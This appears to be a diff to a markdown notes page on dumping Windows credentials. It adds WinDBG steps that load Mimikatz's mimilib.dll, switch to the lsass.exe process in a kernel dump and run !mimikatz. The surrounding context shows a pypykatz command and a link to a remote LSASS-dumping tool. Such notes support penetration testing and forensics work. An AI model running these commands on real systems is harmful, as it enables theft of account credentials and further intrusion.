@@ -41,6 +41,17 @@ $ pypykatz lsa rekall -o /tmp/creds.txt /workdir/memdump.mem
 ...
 ~~~
 
+Extract LSASS from kernel dump with WinDBG and Mimikatz.
+
+~~~
+.load C:\Users\Nobody\Malware\mimilib.dll
+.symfix
+.reload
+!process 0 0 lsass.exe
+.process /r /p ffffdb8ed0936080
+!mimikatz
+~~~
+
 Untested tools:
 
 - [Physmem2profit](https://github.com/fsecurelabs/physmem2profit), dump LSASS by analyzing physical memory remotely
